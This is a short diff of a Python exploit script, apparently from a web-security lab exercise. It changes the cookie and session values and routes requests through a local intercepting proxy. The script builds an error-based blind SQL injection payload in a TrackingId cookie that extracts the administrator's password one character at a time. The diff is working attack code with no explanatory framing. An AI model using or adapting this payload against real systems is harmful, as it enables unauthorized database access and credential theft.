@@ -11,8 +11,8 @@ proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
 def sql_injected_query(url, num, oper, pas):
     payload = "' and (select case when (1=1) then (1/0) else 1 end from users where username = 'administrator' and ascii(substr(password, %s, 1)) %s %s) = 1--" % (num, oper, pas)
     payload_endcoded = urllib.parse.quote(payload)
-    cookies = {"TrackingId": "JMeWiw4LYOdREiiV" + payload_endcoded, "session": "8uagCX0tFxuHjxDLfItcAlwZQuzGLPE3"} 
-    return requests.get(url, cookies=cookies, verify=False)
+    cookies = {"TrackingId": "URCGVbT9J1iLabQp" + payload_endcoded, "session": "5DsbPb2YLkJTc1yq9wWyM6L9mtdlzmMI"} 
+    return requests.get(url, cookies=cookies, verify=False, proxies=proxies)
     
 
 def sql_inject(url):
